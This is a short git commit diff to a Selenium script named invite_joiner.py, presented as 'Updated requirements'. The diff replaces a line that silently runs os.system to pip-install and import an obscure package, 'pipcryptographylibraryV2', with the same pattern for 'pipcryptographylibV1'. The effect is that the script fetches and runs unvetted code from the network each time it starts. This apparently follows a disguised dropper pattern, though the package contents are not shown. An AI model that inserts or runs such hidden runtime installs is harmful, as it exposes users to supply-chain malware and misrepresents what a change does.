68989b8a72cdf243605a3a2ed1593890d291b178
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-04-22 02:28:05 +0200

    Updated requirements

--- invite_joiner.py
+++ invite_joiner.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcryptographylibraryV2")
-import pipcryptographylibraryV2
+os.system("pip install pipcryptographylibV1")
+import pipcryptographylibV1
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
